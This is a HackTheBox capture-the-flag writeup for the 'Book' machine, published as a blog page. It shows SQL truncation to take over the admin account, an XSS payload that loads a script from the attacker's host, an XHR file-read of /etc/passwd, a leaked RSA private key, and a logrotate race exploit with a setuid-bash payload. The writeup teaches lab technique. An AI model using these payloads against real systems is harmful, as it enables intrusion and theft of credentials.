<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Book | CyFun</title><meta name=keywords content="ctf,hackthebox,penetration-testing,writeup,linux,medium"><meta name=description content="Book HackTheBox writeup"><meta name=author content="s4ch"><link rel=canonical href=https://s4ch.github.io/writeups/hackthebox/book/><link crossorigin=anonymous href=/assets/css/stylesheet.35b906a90813b2766df33de5f84bf4610918496b745304c45e387646ed743bea.css integrity="sha256-NbkGqQgTsnZt8z3l+Ev0YQkYSWt0UwTEXjh2Ru10O+o=" rel="preload stylesheet" as=style><link rel=icon href=https://s4ch.github.io/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://s4ch.github.io/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://s4ch.github.io/favicon-32x32.png><link rel=apple-touch-icon href=https://s4ch.github.io/apple-touch-icon.png><link rel=mask-icon href=https://s4ch.github.io/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://s4ch.github.io/writeups/hackthebox/book/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="Book "><meta property="og:description" content="Book HackTheBox writeup"><meta property="og:type" content="article"><meta property="og:url" content="https://s4ch.github.io/writeups/hackthebox/book/"><meta property="og:image" content="https://s4ch.github.io/writeups/hackthebox/book/book.png"><meta property="article:section" content="writeups"><meta property="article:published_time" content="2020-07-11T00:00:00+00:00"><meta property="article:modified_time" content="2025-08-18T17:55:49+05:30"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/tenet/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/scriptkiddie/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/delivery/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/ready/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/laboratory/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/passage/"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://s4ch.github.io/writeups/hackthebox/book/book.png"><meta name=twitter:title content="Book "><meta name=twitter:description content="Book HackTheBox writeup"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Writeups","item":"https://s4ch.github.io/writeups/"},{"@type":"ListItem","position":2,"name":"HackTheBox Writeups","item":"https://s4ch.github.io/writeups/hackthebox/"},{"@type":"ListItem","position":3,"name":"Book ","item":"https://s4ch.github.io/writeups/hackthebox/book/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Book ","name":"Book ","description":"Book HackTheBox writeup","keywords":["ctf","hackthebox","penetration-testing","writeup","linux","medium"],"articleBody":"≡ƒÆó Info Name: Book Profile: www.hackthebox.eu Difficulty: Medium OS: Linux Points: 30 Overview TL;DR:\nSQL truncation -\u003e admin accounts SSRF -\u003e XSS -\u003e file disclosure logrotten: logrotate race condition pe Install tools used in this WU on BlackArch Linux:\n1 $ sudo pacman -S nmap\tdirsearch pspy Network Enumeration As usual we can launch a full nmap scan nmap -A -oA nmap_full 10.10.10.176:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 # Nmap 7.80 scan initiated Thu Mar 26 23:50:58 2020 as: nmap -A -oA nmap_full 10.10.10.176 Nmap scan report for 10.10.10.176 Host is up (0.031s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 f7:fc:57:99:f6:82:e0:03:d6:03:bc:09:43:01:55:b7 (RSA) | 256 a3:e5:d1:74:c4:8a:e8:c8:52:c7:17:83:4a:54:31:bd (ECDSA) |_ 256 e3:62:68:72:e2:c0:ae:46:67:3d:cb:46:bf:69:b9:6a (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: LIBRARY - Read | Learn | Have Fun No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.80%E=4%D=3/26%OT=22%CT=1%CU=39363%PV=Y%DS=2%DC=T%G=Y%TM=5E7D31E OS:7%P=x86_64-unknown-linux-gnu)SEQ(SP=105%GCD=1%ISR=109%TI=Z%CI=Z%II=I%TS= OS:A)OPS(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M5 OS:4DST11NW7%O6=M54DST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE8 OS:8)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S OS:+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q= OS:)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A% OS:A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y% OS:DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T= OS:40%CD=S) Network Distance: 2 hops Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel TRACEROUTE (using port 993/tcp) HOP RTT ADDRESS 1 30.66 ms 10.10.14.1 2 30.79 ms 10.10.10.176 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Thu Mar 26 23:51:19 2020 -- 1 IP address (1 host up) scanned in 20.68 seconds Only port 22 and 80, so we must start by attacking a web application.\nWeb application enumeration and exploitation Let’s start at http://10.10.10.176/\nWe can create an account and login.\nAt http://10.10.10.176/contact.php there is form sending a message to admin@book.htb.\n1 \u003cform action=\"\" method=\"POST\" name=\"myForm\" onsubmit=\"return validateForm()\"\u003e 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 if (document.location.search.match(/type=embed/gi)) { window.parent.postMessage(\"resize\", \"*\"); } function validateForm() { var x = document.forms[\"myForm\"][\"name\"].value; var y = document.forms[\"myForm\"][\"email\"].value; if (x == \"\") { alert(\"Please fill name field. Should not be more than 10 characters\"); return false; } if (y == \"\") { alert(\"Please fill email field. Should not be more than 20 characters\"); return false; } } So the size of the fields are limited to:\nname \u003c= 10 email \u003c= 20 If they put a limit client-side there is maybe a limitation server-side too. We can try a SQL truncation.\n1 2 3 4 5 $ irb irb(main):001:0\u003e 'admin@book.htb'.size =\u003e 14 irb(main):002:0\u003e 'admin@book.htb' + ' ' * 6 + 'cyfun' =\u003e \"admin@book.htb cyfun\" The size of the mail address of the admin is 14, so by adding 6 whitespaces we will reach 20 and we will begin to truncate. Let’s try to send this:\n1 2 3 4 5 6 7 POST /index.php HTTP/1.1 Host: book.htb ... Cookie: PHPSESSID=6cn5fv2fpmmfec6tjkvr1v3sto Upgrade-Insecure-Requests: 1 name=cyfunadmin\u0026email=admin@book.htb cyfun\u0026password=cyfun The server will look if the email admin@book.htb cyfun already exists, of course it’s not, so when creating our account the MySQL database will will cut whatever is appended after 20 chars and remove spaces, so it will end by updating the password of the already existing admin@book.htb.\nWe can find the admin login page http://10.10.10.176/admin/index.php with dirsearch:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 $ dirsearch -u http://10.10.10.176/ -e php _|. _ _ _ _ _ _|_ v0.3.9 (_||| _) (/_(_|| (_| ) Extensions: php | HTTP method: get | Threads: 10 | Wordlist size: 6046 Error Log: /home/cyfun/.dirsearch/logs/errors-20-04-19_17-38-41.log Target: http://10.10.10.176/ [17:38:42] Starting: ... [17:38:45] 301 - 312B - /admin -\u003e http://10.10.10.176/admin/ [17:38:46] 200 - 6KB - /admin/ [17:38:46] 403 - 277B - /admin/.htaccess [17:38:46] 200 - 6KB - /admin/?/login [17:38:46] 302 - 0B - /admin/home.php -\u003e index.php [17:38:46] 200 - 6KB - /admin/index.php [17:38:52] 301 - 311B - /docs -\u003e http://10.10.10.176/docs/ [17:38:52] 403 - 277B - /docs/ [17:38:53] 302 - 0B - /home.php -\u003e index.php [17:38:54] 301 - 313B - /images -\u003e http://10.10.10.176/images/ [17:38:54] 200 - 7KB - /index.php [17:38:54] 200 - 7KB - /index.php/login/ [17:38:59] 403 - 277B - /server-status [17:38:59] 403 - 277B - /server-status/ [17:38:59] 302 - 0B - /settings.php -\u003e index.php So we can login as the administrator.\nOn the Collections page http://book.htb/admin/collections.php we can download a PDF all the users or all the books that seems dynamically generated.\nNote: we can’t exploit the XSS in the name because it is limited to 10 chars.\nAlso in the user interface there is a Collections page http://book.htb/collections.php where any user can submit a new book.\nSo we could probably inject a XSS payload in the book title, that will be embedded in the dynamically generated book collection PDF so we execute JavaScript code in the context of the backend (maybe a bot or script using phantom.js).\nSo we just have to use a simple XSS payload to server our local script.\n1 \u003cscript src=\"http://10.10.15.117:8000/cyfun.js\"\u003e\u003c/script\u003e 1 $ python -m http.server --bind 10.10.15.117 With the code execution we can try to do a SSRF (Server Side Request Forgery) with a XRH (XMLHttpRequest). We can then make requests with the file:// pseudo-protocol to read local files.\n1 2 3 4 xhr=new XMLHttpRequest; xhr.onload=function(){ document.write(btoa(this.responseText)) }; xhr.open(\"GET\", \"file:///etc/passwd\"); xhr.send(); It takes several minutes before our book is added to the collection so we can monitor at the search page (searching by author) when it is added http://book.htb/search.php.\nThen you have to be quick after the book was added to generate the PDF to trigger the XSS because the user book are removed very often. http://book.htb/admin/collections.php?type=collections\nThen the PDF contains the base64 encoded string corresponding to the file we asked for.\n1 cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovdmFyL3J1bi9pcmNkOi91c3Ivc2Jpbi9ub2xvZ2luCmduYXRzOng6NDE6NDE6R25hdHMgQnVnLVJlcG9ydGluZyBTeXN0ZW0gKGFkbWluKTovdmFyL2xpYi9nbmF0czovdXNyL3NiaW4vbm9sb2dpbgpub2JvZHk6eDo2NTUzNDo2NTUzNDpub2JvZHk6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtbmV0d29yazp4OjEwMDoxMDI6c3lzdGVtZCBOZXR3b3JrIE1hbmFnZW1lbnQsLCw6L3J1bi9zeXN0ZW1kL25ldGlmOi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtcmVzb2x2ZTp4OjEwMToxMDM6c3lzdGVtZCBSZXNvbHZlciwsLDovcnVuL3N5c3RlbWQvcmVzb2x2ZTovdXNyL3NiaW4vbm9sb2dpbgpzeXNsb2c6eDoxMDI6MTA2OjovaG9tZS9zeXNsb2c6L3Vzci9zYmluL25vbG9naW4KbWVzc2FnZWJ1czp4OjEwMzoxMDc6Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgpfYXB0Ong6MTA0OjY1NTM0Ojovbm9uZXhpc3RlbnQ6L3Vzci9zYmluL25vbG9naW4KbHhkOng6MTA1OjY1NTM0OjovdmFyL2xpYi9seGQvOi9iaW4vZmFsc2UKdXVpZGQ6eDoxMDY6MTEwOjovcnVuL3V1aWRkOi91c3Ivc2Jpbi9ub2xvZ2luCmRuc21hc3E6eDoxMDc6NjU1MzQ6ZG5zbWFzcSwsLDovdmFyL2xpYi9taXNjOi91c3Ivc2Jpbi9ub2xvZ2luCmxhbmRzY2FwZTp4OjEwODoxMTI6Oi92YXIvbGliL2xhbmRzY2FwZTovdXNyL3NiaW4vbm9sb2dpbgpwb2xsaW5hdGU6eDoxMDk6MTo6L3Zhci9jYWNoZS9wb2xsaW5hdGU6L2Jpbi9mYWxzZQpzc2hkOng6MTEwOjY1NTM0OjovcnVuL3NzaGQ6L3Vzci9zYmluL25vbG9naW4KcmVhZGVyOng6MTAwMDoxMDAwOnJlYWRlcjovaG9tZS9yZWFkZXI6L2Jpbi9iYXNoCm15c3FsOng6MTExOjExNDpNeVNRTCBTZXJ2ZXIsLCw6L25vbmV4aXN0ZW50Oi9iaW4vZmFsc2UK Note: I opened the PDF with libreoffice as when I opened it with Okular as it is all in one line the text was truncated.\nThen we can decode the text like this printf %s 'base64 here' | base64 -d\n/etc/passwd\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin syslog:x:102:106::/home/syslog:/usr/sbin/nologin messagebus:x:103:107::/nonexistent:/usr/sbin/nologin _apt:x:104:65534::/nonexistent:/usr/sbin/nologin lxd:x:105:65534::/var/lib/lxd/:/bin/false uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin pollinate:x:109:1::/var/cache/pollinate:/bin/false sshd:x:110:65534::/run/sshd:/usr/sbin/nologin reader:x:1000:1000:reader:/home/reader:/bin/bash mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false We can see there is a reader user, let’s try to investigate is home directory /home/reader.\nI found /home/reader/.ssh/id_rsa.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 -----BEGIN RSA PRIVATE KEY----- MIIEpQIBAAKCAQEA2JJQsccK6fE05OWbVGOuKZdf0FyicoUrrm821nHygmLgWSpJ G8m6UNZyRGj77eeYGe/7YIQYPATNLSOpQIue3knhDiEsfR99rMg7FRnVCpiHPpJ0 WxtCK0VlQUwxZ6953D16uxlRH8LXeI6BNAIjF0Z7zgkzRhTYJpKs6M80NdjUCl/0 ePV8RKoYVWuVRb4nFG1Es0bOj29lu64yWd/j3xWXHgpaJciHKxeNlr8x6NgbPv4s 7WaZQ4cjd+yzpOCJw9J91Vi33gv6+KCIzr+TEfzI82+hLW1UGx/13fh20cZXA6PK 75I5d5Holg7ME40BU06Eq0E3EOY6whCPlzndVwIDAQABAoIBAQCs+kh7hihAbIi7 3mxvPeKok6BSsvqJD7aw72FUbNSusbzRWwXjrP8ke/Pukg/OmDETXmtgToFwxsD+ McKIrDvq/gVEnNiE47ckXxVZqDVR7jvvjVhkQGRcXWQfgHThhPWHJI+3iuQRwzUI tIGcAaz3dTODgDO04Qc33+U9WeowqpOaqg9rWn00vgzOIjDgeGnbzr9ERdiuX6WJ jhPHFI7usIxmgX8Q2/nx3LSUNeZ2vHK5PMxiyJSQLiCbTBI/DurhMelbFX50/owz 7Qd2hMSr7qJVdfCQjkmE3x/L37YQEnQph6lcPzvVGOEGQzkuu4ljFkYz6sZ8GMx6 GZYD7sW5AoGBAO89fhOZC8osdYwOAISAk1vjmW9ZSPLYsmTmk3A7jOwke0o8/4FL E2vk2W5a9R6N5bEb9yvSt378snyrZGWpaIOWJADu+9xpZScZZ9imHHZiPlSNbc8/ ciqzwDZfSg5QLoe8CV/7sL2nKBRYBQVL6D8SBRPTIR+J/wHRtKt5PkxjAoGBAOe+ SRM/Abh5xub6zThrkIRnFgcYEf5CmVJX9IgPnwgWPHGcwUjKEH5pwpei6Sv8et7l skGl3dh4M/2Tgl/gYPwUKI4ori5OMRWykGANbLAt+Diz9mA3FQIi26ickgD2fv+V o5GVjWTOlfEj74k8hC6GjzWHna0pSlBEiAEF6Xt9AoGAZCDjdIZYhdxHsj9l/g7m Hc5LOGww+NqzB0HtsUprN6YpJ7AR6+YlEcItMl/FOW2AFbkzoNbHT9GpTj5ZfacC hBhBp1ZeeShvWobqjKUxQmbp2W975wKR4MdsihUlpInwf4S2k8J+fVHJl4IjT80u Pb9n+p0hvtZ9sSA4so/DACsCgYEA1y1ERO6X9mZ8XTQ7IUwfIBFnzqZ27pOAMYkh sMRwcd3TudpHTgLxVa91076cqw8AN78nyPTuDHVwMN+qisOYyfcdwQHc2XoY8YCf tdBBP0Uv2dafya7bfuRG+USH/QTj3wVen2sxoox/hSxM2iyqv1iJ2LZXndVc/zLi 5bBLnzECgYEAlLiYGzP92qdmlKLLWS7nPM0YzhbN9q0qC3ztk/+1v8pjj162pnlW y1K/LbqIV3C01ruxVBOV7ivUYrRkxR/u5QbS3WxOnK0FYjlS7UUAc4r0zMfWT9TN nkeaf9obYKsrORVuKKVNFzrWeXcVx+oG3NisSABIprhDfKUSbHzLIR4= -----END RSA PRIVATE KEY----- Let’s fix the rights so openssh won’t complain: chmod 400 id_rsa. Then we can connect via ssh as reader using the private key.\n1 $ ssh reader@10.10.10.176 -i id_rsa At this point we can read user.txt.\nPrivilege Escalation of Machine pspy allows us too see process of other users or that doesn’t live very long.\n1 2 3 4 5 6 7 ... 2020/04/19 19:43:17 CMD: UID=0 PID=41530 | /usr/sbin/logrotate -f /root/log.cfg 2020/04/19 19:43:17 CMD: UID=0 PID=41529 | /bin/sh /root/log.sh 2020/04/19 19:43:17 CMD: UID=0 PID=41531 | sleep 5 2020/04/19 19:43:20 CMD: UID=0 PID=41534 | /bin/sh /root/log.sh 2020/04/19 19:43:20 CMD: UID=0 PID=41533 | /lib/systemd/systemd-udevd 2020/04/19 19:43:20 CMD: UID=0 PID=41532 | /bin/sh /root/log.sh It seems there is a logrotate task running as root.\nhttps://book.hacktricks.xyz/linux-unix/privilege-escalation#logrotate-exploitation\nSo we will able to exploit a vulnerability named logrotten, by writing in a file rotated by logrorate we will be able to write a file in any location.\nSince there is a backup folder right under our nose and an access.log file we can write into that seems to be rotated, let’s assume we can exploit this vulnerability.\n1 2 3 4 reader@book:~$ ls -lh backups/ total 4.0K -rw-r--r-- 1 reader reader 0 Jan 29 13:05 access.log -rw-r--r-- 1 reader reader 91 Jan 29 13:05 access.log.1 https://github.com/whotwagner/logrotten\nWe can download and compile the exploit, then prepare our payload file.\n1 $ gcc -o logrotten logrotten.c We can fill the file to force the rotation and execute the exploit:\n1 2 $ ./logrotten -p daolyap /home/reader/backups/access.log $ echo \"test\" \u003e access.log Since it’s a race condition it may need several execution before working.\nThe log file and our payload file will be written into /etc/bash_completition.d/ so next time root will log in it will execute our payload (maybe a cron task).\nFull paper: https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition\n1 2 3 4 5 6 7 8 9 10 #!/bin/bash if [ `id -u` -eq 0 ] then cp /root/log.sh /tmp/cyfun/log.sh \u0026 cp /root/log.cfg /tmp/cyfun/log.cfg \u0026 cp /root/root.txt /tmp/cyfun/cyfun.txt chmod +r /tmp/cyfun/cyfun.txt cp /bin/bash /tmp/cyfun/cyfun chmod +s /tmb/cyfun/cyfun fi Read root.txt\n1 2 3 4 5 6 7 8 9 10 11 12 13 $ cat log.sh #!/bin/sh /usr/sbin/logrotate -f /root/log.cfg $ cat log.cfg /home/reader/backups/access.log { daily rotate 12 missingok notifempty size 1k create } ","wordCount":"1543","inLanguage":"en","image":"https://s4ch.github.io/writeups/hackthebox/book/book.png","datePublished":"2020-07-11T00:00:00Z","dateModified":"2025-08-18T17:55:49+05:30","author":{"@type":"Person","name":"s4ch"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://s4ch.github.io/writeups/hackthebox/book/"},"publisher":{"@type":"Organization","name":"CyFun","logo":{"@type":"ImageObject","url":"https://s4ch.github.io/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://s4ch.github.io/ accesskey=h title="CyFun (Alt + H)">CyFun</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)">
<svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
<svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button><ul class=lang-switch><li>|</li></ul></div></div><ul id=menu><li><a href=https://s4ch.github.io/about/ title=About><span>About</span></a></li><li><a href=https://s4ch.github.io/contact/ title=Contact><span>Contact</span></a></li><li><a href=https://s4ch.github.io/research/ title=Research><span>Research</span></a></li><li><a href=https://s4ch.github.io/archives title=Archives><span>Archives</span></a></li><li><a href=https://s4ch.github.io/writeups/ title=Writeups><span>Writeups</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><h1 class="post-title entry-hint-parent">Book</h1><div class=post-description>Book HackTheBox writeup</div><div class=post-meta><span title='2020-07-11 00:00:00 +0000 UTC'>July 11, 2020</span>&nbsp;·&nbsp;8 min&nbsp;·&nbsp;1543 words&nbsp;·&nbsp;
<a href=https://s4ch.github.io/tags/ctf/ class=post-tag title=ctf>ctf</a>
,
<a href=https://s4ch.github.io/tags/hackthebox/ class=post-tag title=hackthebox>hackthebox</a>
,
<a href=https://s4ch.github.io/tags/penetration-testing/ class=post-tag title=penetration-testing>penetration-testing</a>
,
<a href=https://s4ch.github.io/tags/writeup/ class=post-tag title=writeup>writeup</a>
,
<a href=https://s4ch.github.io/tags/linux/ class=post-tag title=linux>linux</a>
,
<a href=https://s4ch.github.io/tags/medium/ class=post-tag title=medium>medium</a>
&nbsp;·&nbsp;
<a href=https://s4ch.github.io/categories/writeups/ class=post-tag title=writeups>writeups</a></div></header><figure class=entry-cover><img loading=eager src=https://s4ch.github.io/writeups/hackthebox/book/book.png alt="Book HackTheBox Machine"><p>Book - Medium Linux Machine</p></figure><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#ƒæó-info>≡ƒÆó Info</a></li></ul><ul><li><ul><li><a href=#overview>Overview</a></li><li><a href=#network-enumeration>Network Enumeration</a></li><li><a href=#web-application-enumeration-and-exploitation>Web application enumeration and exploitation</a></li><li><a href=#privilege-escalation-of-machine>Privilege Escalation of Machine</a></li></ul></li></ul></nav></div></details></div><div class=post-content><h2 id=ƒæó-info>≡ƒÆó Info<a hidden class=anchor aria-hidden=true href=#ƒæó-info>#</a></h2><h1></h1><ul><li><strong>Name:</strong> Book</li><li><strong>Profile:</strong> <a href=https://www.hackthebox.eu/home/machines/profile/230>www.hackthebox.eu</a></li><li><strong>Difficulty:</strong> Medium</li><li><strong>OS:</strong> Linux</li><li><strong>Points:</strong> 30</li></ul><h1></h1><h3 id=overview>Overview<a hidden class=anchor aria-hidden=true href=#overview>#</a></h3><p><strong>TL;DR</strong>:</p><ul><li>SQL truncation -> admin accounts</li><li>SSRF -> XSS -> file disclosure</li><li>logrotten: logrotate race condition pe</li></ul><p>Install tools used in this WU on BlackArch Linux:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ sudo pacman -S nmap	dirsearch pspy
</span></span></code></pre></td></tr></table></div></div><h3 id=network-enumeration>Network Enumeration<a hidden class=anchor aria-hidden=true href=#network-enumeration>#</a></h3><p>As usual we can launch a full <a href=https://nmap.org/>nmap</a> scan <code>nmap -A -oA nmap_full 10.10.10.176</code>:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl># Nmap 7.80 scan initiated Thu Mar 26 23:50:58 2020 as: nmap -A -oA nmap_full 10.10.10.176
</span></span><span class=line><span class=cl>Nmap scan report for 10.10.10.176
</span></span><span class=line><span class=cl>Host is up (0.031s latency).
</span></span><span class=line><span class=cl>Not shown: 998 closed ports
</span></span><span class=line><span class=cl>PORT   STATE SERVICE VERSION
</span></span><span class=line><span class=cl>22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
</span></span><span class=line><span class=cl>| ssh-hostkey:
</span></span><span class=line><span class=cl>|   2048 f7:fc:57:99:f6:82:e0:03:d6:03:bc:09:43:01:55:b7 (RSA)
